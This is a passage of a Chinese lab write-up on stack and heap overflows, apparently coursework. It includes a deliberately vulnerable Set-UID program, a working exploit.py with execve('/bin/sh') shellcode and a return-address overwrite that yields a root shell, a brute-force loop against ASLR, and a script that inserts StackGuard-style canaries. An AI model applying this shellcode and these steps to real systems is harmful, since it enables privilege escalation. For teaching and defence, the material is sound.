    <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">400</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    FILE <span class="token operator">*</span>badfile<span class="token punctuation">;</span>
    badfile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"badfile"</span> <span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fread</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">300</span> <span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// ➁</span>
    <span class="token function">foo</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Returned Properly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过以下指令来编译该程序，将它转换成有 <code>root</code> 权限的 <code>Set-UID</code> 程序：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc -o stack -z execstack -fno-stack-protector stack.c 
<span class="token function">sudo</span> <span class="token function">chown</span> root stack 
<span class="token function">sudo</span> <span class="token function">chmod</span> <span class="token number">4755</span> stack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>我们构造的实验环境是当把一个字符串复制到缓冲区中时，其长度超过大小的情况。</p>
<p>➁语句执行完毕后，进入实验过程。为理解程序的行为，在 <code>badfile</code> 中放入一些随机内容。注意到，当文件长度小于100 个字节时，程序可以正常运行; 当文件长度大于 100 个字节时，程序会崩溃，这正是由缓冲区溢出导致的。</p>
<p>具体指令为：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">"aaaa"</span> <span class="token operator">></span> badfile 
$ ./stack 
Returned Properly 
$ <span class="token builtin class-name">echo</span> <span class="token string">"aaa · · ·(此处略去 100 个字符)· · · aaa"</span> <span class="token operator">></span> badfile 
$ ./stack 
Segmentation fault <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>会出现预期的段错误提示，实验过程截图如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107155734824.png" alt="image-20230107155734824"></p>
<h4 id="3-1-2-实施缓冲区溢出攻击"><a href="#3-1-2-实施缓冲区溢出攻击" class="headerlink" title="3.1.2 实施缓冲区溢出攻击"></a>3.1.2 实施缓冲区溢出攻击</h4><p>我们首先完成关闭地址随机化下的缓冲区溢出攻击。</p>
<p>先用该指令关闭地址随机化：<code>sudo sysctl -w kernel.randomize_va_space=0</code></p>
<p>执行该指令后，<strong>栈的起始地址总是固定的</strong>。</p>
<p>在本实验中，由于拥有目标程序的源代码，因此可以重新编译它，加入调试信息，以方便进行调试。</p>
<p>使用 <code>gdb</code> 来调试可执行文件 <code>stack dbg</code>，且在运行程序之前，使用<code>touch badfile</code> 命令创建一个 <code>badfile</code> 文件。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107160152179.png" alt="image-20230107160152179"></p>
<p>在 <code>gdb</code> 中，通过“<code>b foo</code>”命令在 <code>foo()</code> 函数处设置一个断点，接着用 <code>run</code> 命令来运行程序。程序将在 <code>foo()</code> 函数内停下来。这时可以使用 <code>gdb</code> 的 <code>p</code> 指令 (<code>p</code> 指令默认用十六进制打印，<code>p/d</code> 表示用十进制打印) 来打印帧指针 <code>ebp</code> 的值以及 <code>buffer</code> 的地址。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107160319327.png" alt="image-20230107160319327"></p>
<p>从以上的执行结果可以看出，帧指针的值是 <code>0xbfffeaf8</code>。因此，可以看出，返回地址保存在 <code>0xbfffeaf8 + 4</code> 中，并且第一个 <code>NOP</code> 指令在 <code>0xbfffeaf8 + 8</code>。因此， 可以将 <code>0xbfffeaf8 + 8</code> 作为恶意代码的入口地址，把它写入返回地址字段中。</p>
<p>由于输入将被复制到 <code>buffer</code> 中，<strong>为了让输入中的返回地址字段准确地覆盖栈中的返回地址区域，需要知道栈中buffer 和返回地址区域之间的距离，这个距离就是返回地址字段在输入数据中的相对位置。</strong></p>
<p>从调试信息可以轻松地获知 <code>buffer</code> 的起始地址，然后计算出从 <code>ebp</code> 到 <code>buffer</code> 起始处的距离。通过计算，得到的结果是 <code>108</code>。由于返回地址区域在 <code>ebp</code> 指向位置上面的 <code>4</code> 字节处，因此返回地址区域到 <code>buffer</code> 起始处的距离就是 <code>112</code>。</p>
<p>下面我们用 <code>exploit.py</code> 生成恶意输入文件 <code>badfile</code>。我将该python文件完成的功能总结为以下四点：</p>
<p>（1）找到 “<code>/bin/sh</code>’’ 字符串在内存中的地址并设置 <code>ebx</code>;</p>
<p>（2）找到 <code>name</code> 数组的地址并设置 <code>ecx——name[0]</code> 中存放的是 “<code>/bin/sh</code>’’ 的地址，<code>name[1]</code> 中存放的是空指针</p>
<p>（3）将 <code>edx</code> 设为 0;</p>
<p>（4）调用 <code>execve()</code> 系统调用。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3 </span>
<span class="token keyword">import</span> sys 
 
shellcode<span class="token operator">=</span> <span class="token punctuation">(</span> 
    <span class="token string">"\x31\xc0"</span>	<span class="token comment"># xorl %eax,%eax </span>
    <span class="token string">"\x50"</span>		<span class="token comment"># pushl %eax  </span>
    <span class="token string">"\x68"</span><span class="token string">"//sh"</span> 	<span class="token comment"># pushl $0x68732f2f  </span>
    <span class="token string">"\x68"</span><span class="token string">"/bin"</span> 	<span class="token comment"># pushl $0x6e69622f  </span>
    <span class="token string">"\x89\xe3"</span>	<span class="token comment"># movl %esp,%ebx </span>
    <span class="token string">"\x50"</span>		<span class="token comment"># pushl %eax </span>
    <span class="token string">"\x53"</span>		<span class="token comment"># pushl %ebx </span>
    <span class="token string">"\x89\xe1"</span>	<span class="token comment"># movl %esp,%ecx </span>
    <span class="token string">"\x99"</span>		<span class="token comment"># cdq </span>
    <span class="token string">"\xb0\x0b"</span>	<span class="token comment"># movb $0x0b,%al </span>
    <span class="token string">"\xcd\x80"</span>	<span class="token comment"># int $0x80 </span>
<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span> 
<span class="token comment"># Fill the content with NOP s' </span>
content <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x90</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token comment"># Put the shellcode at the end </span>
start <span class="token operator">=</span> <span class="token number">300</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span> 
content<span class="token punctuation">[</span>start<span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">=</span> shellcode 
<span class="token comment"># Put the address at the beginning </span>
ret <span class="token operator">=</span> <span class="token number">0xbffff448</span> <span class="token operator">+</span> <span class="token number">100</span> 
content<span class="token punctuation">[</span><span class="token number">112</span><span class="token punctuation">:</span><span class="token number">116</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span> <span class="token string">'little'</span><span class="token punctuation">)</span>	<span class="token comment"># ➃ </span>
 
<span class="token comment"># Write the content to a file  </span>
<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"badfile"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span>  
<span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>  
<span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>现在可以运行 <code>exploit.py</code> 来产生 <code>badfile</code> 文件。该文件产生之后，运行 <code>Set-UID</code> 漏洞程序，它从 <code>badfile</code> 文件中复制数据，造成缓冲区溢出。下面的结果显示得到了 <code>#</code> 提示符，这表明已经成功获取了 <code>root</code> 权限。使用 <code>id</code> 命令能够验证当前用户的有效用户 <code>ID (euid)</code> 的确是 0。实验截图如图：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107160601037.png" alt="image-20230107160601037"></p>
<p>接下来我们在 32 位机器上击败堆栈随机化。我编写了以下脚本来反复发起缓冲区溢出攻击，希望我们对内存地址的猜测会偶然正确。在运行脚本之前，我们需要通过设置内核来打开内存随机化 <code>kernel.randomizevaspace</code> 值为 <code>2</code>。</p>
<p>在上述攻击中，我们在 <code>badfile</code> 中准备了恶意输入，但由于内存随机化，我们输入的地址可能不正确。从下面的执行轨迹可以看出，当地址不正确时，程序会崩溃(<code>core dumped</code>)。然而，在此次实验中，在运行脚本在第34分钟（10537次）后，我们放在 <code>badfile</code> 中的地址碰巧正确，<code>shellcode</code> 被触发，获得了 <code>root</code> 权限。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107160637948.png" alt="image-20230107160637948"></p>
<p><code>./defeaLrand.sh</code> 代码如下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
 
<span class="token assign-left variable"><span class="token environment constant">SECONDS</span></span><span class="token operator">=</span><span class="token number">0</span>
<span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token number">0</span>
 
<span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token number">1</span> <span class="token punctuation">]</span> <span class="token keyword">do</span>
<span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span> $value <span class="token operator">+</span> <span class="token number">1</span> <span class="token variable">))</span></span> <span class="token assign-left variable">duration</span><span class="token operator">=</span><span class="token environment constant">$SECONDS</span> <span class="token assign-left variable">min</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>$duration <span class="token operator">/</span> <span class="token number">60</span> <span class="token variable">))</span></span> <span class="token assign-left variable">sec</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>$duration <span class="token operator">%</span> <span class="token number">60</span><span class="token variable">))</span></span>
<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$min</span> minutes and <span class="token variable">$sec</span> seconds elapsed ."</span>
<span class="token builtin class-name">echo</span> <span class="token string">"The program has been running <span class="token variable">$value</span> times so far ."</span>
./stack <span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="3-1-3-设计缓冲区溢出漏洞分析工具"><a href="#3-1-3-设计缓冲区溢出漏洞分析工具" class="headerlink" title="3.1.3 设计缓冲区溢出漏洞分析工具"></a>3.1.3 设计缓冲区溢出漏洞分析工具</h4><p>基于堆栈的缓冲区溢出攻击需要修改返回地址；如果我们能在从函数返回之前检测到返回地址是否被修改，我们就能阻止攻击。有许多方法可以实现这一点。一种方法是将返回地址的副本存储在其他地方(不在堆栈上，因此不能通过缓冲区溢出来覆盖)， 并使用它来检查返回地址是否被修改。这种方法的一个典型实现是 <code>Stackshield</code>。另一种方法是在返回地址和缓冲区之间放置一个随机值，并使用这个随机值来检测返回地址是否被修改。这种方法的典型实现是 <code>StackGuard</code> 。<code>StackGuard</code> 已经并入编译器，包括 <code>gcc</code>。</p>
<p><code>StackGuard</code> 的关键思想是，对于修改返回地址的缓冲区溢出攻击，缓冲区和返回地址之间的所有堆栈内存都将被覆盖。这是因为如 <code>strcpy()</code>和 <code>memcpy()</code> 等的内存复制功能，将数据复制到连续的内存位置，因此不可能有选择地修改某些位置，而保持其他位置不变。如果我们不想在内存复制期间影响特定位置的值，唯一的方法是用存储在该位置的相同值覆盖该位置。</p>
<p>基于这个思想，我们可以在缓冲区和返回地址之间放置一些不可预测的值(称为<code>Guard</code>（防护）)。在从函数返回之前，我们检查该值是否被修改。如果它被修改了， 返回地址也可能被修改了。因此，检测返回地址是否被重写的问题被简化为检测保护地址是否被重写。这两个问题看似相同，其实不然。通过查看返回地址的值，我们不知道它的值是否被修改，但是由于 <code>Guard</code>（防护）的值是由我们放置的，所以很容易知道 <code>Guard</code>（防护）的值是否被修改。</p>
<p>我们将用一个秘密初始化变量 <code>guard</code>。这个秘密是 <code>main()</code> 函数中生成的随机数，所以每次程序运行，随机数都不一样。只要秘密是不可预测的，如果缓冲区的溢出导致了返回地址的修改，它也必须覆盖保护中的值。在仍能修改返回地址的情况下不修改保护的唯一方法是用其原始值覆盖保护。因此，攻击者需要猜测秘密号码是什么，如果号码是随机的，并且足够大，就很难做到。</p>
<p>基于以上思想，我们可以在 <code>stack.c</code> 添加以下代码，当发生缓冲区溢出攻击时，可以检测到并输出”<code>***stack smashing detected***</code>“，并将程序退出。<code>demo.c</code> 可设计如下：</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> secret<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token keyword">int</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> guard<span class="token punctuation">;</span>
	guard <span class="token operator">=</span> secret<span class="token punctuation">;</span>
	<span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token keyword">if</span> <span class="token punctuation">(</span>guard <span class="token operator">!=</span> secret<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"***stack smashing detected***"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
 
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	secret <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> guard<span class="token punctuation">;</span>
	guard <span class="token operator">=</span> secret<span class="token punctuation">;</span>
	<span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	FILE <span class="token operator">*</span>badfile<span class="token punctuation">;</span>
	badfile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"badfile"</span> <span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fread</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">300</span> <span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">foo</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>guard <span class="token operator">!=</span> secret<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"***stack smashing detected***"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Returned Properly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>接下来我们设计脚本，使其能够自动添加“StackGuard”的语句。设计具体思路如下：</p>
<p>（1） 在程序的开头添加 <code>int secret; #include &lt;time.h&gt;</code> 语句，其中 <code>secret</code> 是全局变量，<code>time.h</code> 用于后续生成随机数。</p>
<p>（2） 在每次看到 <code>&#123;</code> 的地方添加语句（即在每个函数开头添加以下语句）：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> guard<span class="token punctuation">;</span> 
guard <span class="token operator">=</span> secret<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>（3） 在每次看到程序将要返回时（即看到return 1;），添加以下语句：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>guard <span class="token operator">!=</span> secret<span class="token punctuation">)</span> 
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"***stack smashing detected***"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>（4） 在 <code>main</code> 函数开头另外添加以下语句：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">&#123;</span><span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
secret <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>运行时，如果程序发现了缓冲区溢出，将打印”<code>***stack smashing detected***</code>“，并将程序退出，从而防止缓冲区溢出攻击。</p>
<p>相关脚本文件（<code>a.py</code>）如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os <span class="token punctuation">,</span>sys
<span class="token keyword">import</span> re
 
<span class="token comment"># 脚本文件所在的文件夹</span>
<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">'C:\\Users\\Qian Zeshu\\Desktop\\osexp\\stack.c'</span>
<span class="token comment"># 解析后的执行语句保存到的文件</span>
out_file <span class="token operator">=</span> <span class="token string">'C:\\Users\\Qian Zeshu\\Desktop\\osexp\\demo.c'</span>
i <span class="token operator">=</span> <span class="token number">0</span>
table <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8-sig'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> op<span class="token punctuation">:</span>  <span class="token comment">#设置为可读</span>
    flag1 <span class="token operator">=</span> <span class="token number">0</span>
    flag2 <span class="token operator">=</span> <span class="token number">0</span>
    lines <span class="token operator">=</span> op<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>
        flag <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>out_file<span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8-sig'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pop<span class="token punctuation">:</span> <span class="token comment">#设置为可读可写</span>
            <span class="token keyword">if</span> flag1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                pop<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'int secret;\n'</span><span class="token punctuation">)</span>
                pop<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'#include &lt;time.h>\n'</span><span class="token punctuation">)</span>
                flag1 <span class="token operator">=</span> flag1 <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token comment"># 匹配</span>
            matchTable1 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span>line<span class="token punctuation">)</span>
            matchTable2 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">'	return 1;'</span><span class="token punctuation">,</span>line<span class="token punctuation">)</span>
            matchTable3 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">'int main()'</span><span class="token punctuation">,</span>line<span class="token punctuation">)</span>
            <span class="token keyword">if</span> matchTable1<span class="token punctuation">:</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span>flag2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    pop<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span>
                    pop<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'int guard;\n'</span><span class="token punctuation">)</span>
                    pop<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'guard = secret;\n'</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    flag2 <span class="token operator">=</span> <span class="token number">0</span>
                flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">if</span> matchTable2<span class="token punctuation">:</span>
                pop<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'if (guard != secret) &#123;\n'</span><span class="token punctuation">)</span>
                pop<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'printf("***stack smashing detected***");exit(1);&#125;\n'</span><span class="token punctuation">)</span>
                pop<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span>
                flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">if</span> matchTable3<span class="token punctuation">:</span>
                pop<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span>
                pop<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'&#123;srand(time(0));\n'</span><span class="token punctuation">)</span>
                pop<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'secret = rand();\n'</span><span class="token punctuation">)</span>
                pop<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'int guard;\n'</span><span class="token punctuation">)</span>
                pop<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'guard = secret;\n'</span><span class="token punctuation">)</span>
                flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token number">1</span>
                flag2 <span class="token operator">=</span><span class="token number">1</span>
            <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                pop<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span>
        pop<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
op<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如图，程序输出”<code>***stack smashing detected***</code>“后将程序退出，实现了对可能存在缓冲区溢出漏洞的程序的保护。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107161112253.png" alt="image-20230107161112253"></p>
<h3 id="3-2-堆溢出"><a href="#3-2-堆溢出" class="headerlink" title="3.2 堆溢出"></a>3.2 堆溢出</h3><p>本实验的操作系统环境是 <code>Ubuntu 20.04</code>，以 <code>gdb-peda</code> 作为调试器。</p>
<p><code>chunk</code> 是用户申请内存的单位，也是堆管理器管理内存的基本单位，<code>malloc()</code> 返回的指针指向一个 <code>chunk</code> 的数据区域</p>
<p>与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制 <code>EIP</code> ，所以通常我们利用堆溢出的策略是：</p>
<p>1.覆盖与其物理相邻的下一个 <code>chunk</code> 的内容：</p>
<ul>
<li><code>prev_size</code></li>
<li><code>size</code>，主要有三个比特位，以及该堆块真正的大小<ul>
<li><code>NON_MAIN_ARENA</code></li>
<li><code>IS_MAPPED</code></li>
<li><code>PREV_INUSE</code></li>
<li><code>the True chunk size</code></li>
</ul>
</li>
<li><code>chunk content</code>，从而改变程序固有的执行流。</li>
</ul>
<p>2.利用堆中的机制（如 <code>unlink</code> 等 ）来实现任意地址写入（ <code>Write-Anything-Anywhere</code> ）或控制堆块中的内容等效果，从而来控制程序的执行流。</p>
<p>通俗的来讲就是我们利用 <code>fastbin</code> 的分配和回收机制，构造出特定的一条 <code>chunk</code> 链，然后通过对上一个 <code>chunk</code>的写入来溢出覆盖下一个 <code>chunk</code> 的 <code>fb</code> 指针，从而达到于 <code>fastbin_double_free</code> 一样的效果，需要注意的是我们在溢出的时候我们需要保留下一个 <code>chunk</code> 的一些基本信息，比如 <code>size</code> 的大小，<code>inuse</code> 等。</p>
<h4 id="3-2-1-构造具有堆溢出漏洞的程序"><a href="#3-2-1-构造具有堆溢出漏洞的程序" class="headerlink" title="3.2.1 构造具有堆溢出漏洞的程序"></a>3.2.1 构造具有堆溢出漏洞的程序</h4><p>我们设计以下C语言程序。在程序中，用户可以选择申请或释放内存空间：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span>

<span class="token keyword">void</span> <span class="token function">sh</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">system</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>	
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>_IONBF<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> cmd<span class="token punctuation">,</span>idx<span class="token punctuation">,</span>sz<span class="token punctuation">;</span>
	<span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
